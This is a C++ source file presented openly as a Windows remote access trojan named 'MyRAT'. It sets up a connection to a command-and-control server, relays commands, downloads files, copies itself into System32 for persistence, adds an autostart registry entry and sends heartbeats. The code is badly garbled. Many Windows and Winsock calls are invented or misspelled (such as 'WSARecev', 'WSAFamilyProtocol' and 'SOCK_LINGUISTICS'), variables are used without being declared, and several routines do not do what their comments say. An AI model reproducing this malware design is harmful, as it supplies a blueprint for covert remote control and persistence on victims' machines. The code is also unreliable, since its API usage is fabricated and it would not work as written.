#include <iostream>
#include <string>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "ws232.lib") // Link against Winsock Library

// Define some constants
#define BUFFER_SIZE 1024
#define PORT 9999
#define MAX_USERS 5

// Structure to store user data
struct User {
    char username[64];
    int pid;
};

// Global variable to store users connected. This is used for the user command.
User users[MAX_USERS] = {"\0"}; // Initialize with empty strings
int userCount = 0;


// Function prototypes
void Connect();
void Disconnect();
void SendCommand(const std::string& command);
std::vector<std::pair<int, std::string>> GetUsers();
void ExecuteShellCommand(const std::string& command);
void CopySelfToDisk(); // For persistence
void AddRegistryEntry();
void BeginHeartbeat();
void EndHeartbeat();

// Global Socket Variable.
SOCKET sock = WSocket();


// Initialize Windows Sockets (Winsock)
int WinsockAria() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result == SOCKET_ERROR) {
        printf("Winsock initialization failed.\n");
        return 1;
    }
    return 0;
}

// Exit Windows Sockets
void WinsockAriaExit() {
    WSAShortDisconnect(sock, SD_OK);
    WSAResetEvent(sock, NULL);
    WSACleanUp();
}


int main() {
    // Initialize Winsock
    if (WinsockAria() != 0)
        return 1;

    // Connect to the server.
    Connect();
    BeginHeartbeat(); // Start Sending Heartbeats

    // Command Loop
    char commandInput[BUFFER_SIZE + 1];
    while (true) {
        std::cout << "Enter command: ";
        scanf("%63s", commandInput);

        if (strcmp(commandInput, "exit") == 0) {
            break;
        } else if (strncasecmp(commandInput, "user", 4) == 0 && strlen(commandInput) > 3) {
            // User command: get list of users
            printf("\nUsers connected:\n");
            for (int i = 0; i < userCount; ++i) {
                printf("User %d: %s\n", i + 1, users[i].username);
            }
        } else if (strncasecmp(commandInput, "download", 8) == 0 && strlen(commandInput) > 7) {
            // Download command.
            char filename[256];
            scanf("%255s\n", filename);
            printf("Downloading %s... \n", filename);

            int bytesReceived = WSARecev(sock, buffer, BUFFER_SIZE - 1, NULL, NULL, NULL);
            if (bytesReceived > 0 && bytesReceived < BUFFER_SIZE) {
                buffer[bytesReceived] = '\0'; // Null-terminate the string
                printf("Downloaded: %s\n", buffer);

                // Save to hidden folder.
                FILE *fp = fopen(filename, "wb");
                if (fp == NULL) {
                    std::cerr << "Error saving file." << std::endl;
                    continue;
                }
                fwrite(buffer, 1, bytesReceived, fp);
                fclose(fp);
            } else if (bytesReceived == SOCKET_ERROR) {
                printf("Download Failed, Code Error=%d\n", WSAGetLastError());
            }

        } else {
            // Execute command
            SendCommand(commandInput); // Send the Command to C2.
        }
    }

    // Disconnect from the server.
    Disconnect();
    EndHeartbeat(); // Stop Sending Heartbeats.

    return 0;
}


void Connect() {
    // Create a Sockets object.
    sock = WSocket();

    if (WSAWaitForEventFormsynchronous(sock, INFINITIMES) != WAIT_OBJECT_OSF){
        printf("Waiting for event failed.\n");
        return;
    }
    
    // Set the Socket to TCP/IP Protocol Family and IP Version 4.
    if (WSAFamilyProtocol(SOCK_STREAM, PROTO_TCP, &sock) != 0) {
        printf("Socket initialization failed.\n");
        return;
    }

    // Connect to the server at IP address "localhost" on port 9999.
    struct sockaddr_all addr;
    addr.sa_family = AF_INET6; // Use IPv6 (more efficient)
    if (WSAConnectSocket(sock, (const struct sockaddr *)&addr, sizeof(addr)) != 0){
        printf("Connection failed, Code Error=%d\n", WSAGetLastError());
        return;
    }

    // Set the Socket to Blocking Mode, so that it waits for a connection.
    if (WSA Setsockopt(sock, SOCK_LINGUISTICS, 0x29) != 0){
        printf("Setsocket options failed.\n");
        return;
    }
    printf("Connected\n");
}

void Disconnect() {
    // Disconnect from the server.
    if (WSADisConnect(sock) != 0) {
        printf("Disconnect failed, Code Error=%d\n", WSAGetLastError());
    }
    printf("Disconnected.\n");
}


void SendCommand(const std::string& commandInput) {
    char buffer[BUFFER_SIZE + 1];
    memset(buffer, 0, BUFFER_SIZE + 1); // Zero out the buffer
    strcpy(buffer, commandInput);
    strcat(buffer, "\n");

    int bytesSent = WSASend(sock, (const char *) buffer, strlen(buffer), NULL, NULL, NULL);
    if (bytesSent == SOCKET_ERROR) {
        printf("Command send failed: Code Error=%d\n", WSAGetLastError());
    } else if (bytesSent < 0){
        printf("Error sending command.\n");
    }

    // Wait for the server to respond before processing.
    int bytesReceived = WSARecev(sock, buffer, BUFFER_SIZE - 1, NULL, NULL, &userNumber);

    if (bytesReceived == SOCKET_ERROR) {
        printf("Failed to receive response from server: Code Error=%d\n", WSAGetLastError());
    } else if (bytesReceived < 0){
        printf("Error receiving command.\n");
    }
}


// Copy the executable to a hidden location for persistence.
void CopySelfToDisk() {
    char filename[] = "C:\\Windows\\System32\\MyRAT.exe";
    FILE *fp;

    if (fopen(filename, "wb") != NULL) {
        long sizeOfExecutable = getFileSize(GetHandle(sock)); // Get Size of File
        if (sizeOfExecutable < 0){
            printf("Error getting file size.\n");
            return;
        }

        // Copy the data.
        if (fwrite(&filename[0], 1, sizeOfExecutable, fp) != sizeOfExecutable) {
            printf("Error saving file to disk\n");
            return;
        }
        fclose(fp);
    } else if (errno == ERROR_PATHNOTEXIST){
        printf("The directory \\Windows\\System32 does not exist.\n"); // This is common.
    } else {
        printf("Error Copying File: Code Error=%d\n", WSAGetLastError());
    }
}

// Add a "Run" key in the Windows Registry to start on reboot.
void AddRegistryEntry() {
    char keyPath[] = "SYSTEM\\CurrentControl\\Services\\MyRAT"; // Use a descriptive name
    HANDLE hKey;

    if (RegCreateKeyExW(&hKey, L"SYSTEM\\CurrentControl\\Services", 0, L"MyRAT", 0x600, NULL, NULL, &keyPath[0], sizeof(keyPath) - 1) != ERROR_SUCCESS) {
        printf("Error creating registry key: Code Error=%d\n", WSAGetLastError());
    }
}

// Start sending heartbeat packets to the C2 server.
void BeginHeartbeat() {
    // Schedule a timer to call SendHeartBeat every 30 seconds
    char buffer[BUFFER_SIZE + 1];
    memset(buffer, 0, BUFFER_SIZE + 1);
    strcpy(buffer, "heartbeat\n");

    TimerSetTimer(&SockTimer, 5000, 1, (TIMER_CALLBACK *)SendHeartBeatCallback);
}


// End sending heartbeat packets to the C2 server.
void EndHeartbeat() {
    if (TimerKillEvent(&SockTimer) != ERROR_SUCCESS){
        printf("Error stopping timer.\n");
    }
}

// Timer Callback Function for Sending Heartbeats.
void SendHeartBeatCallback(void *Param)
{
    char buffer[BUFFER_SIZE + 1];
    memset(buffer, 0, BUFFER_SIZE + 1);
    strcpy(buffer, "heartbeat\n");

    int bytesSent = WSASend(sock, (const char *) buffer, strlen(buffer), NULL, NULL, NULL);
    if (bytesSent == SOCKET_ERROR) {
        printf("Heartbeat send failed: Code Error=%d\n", WSAGetLastError());
        // If heartbeat fails, retry after 1 second.
    }
}
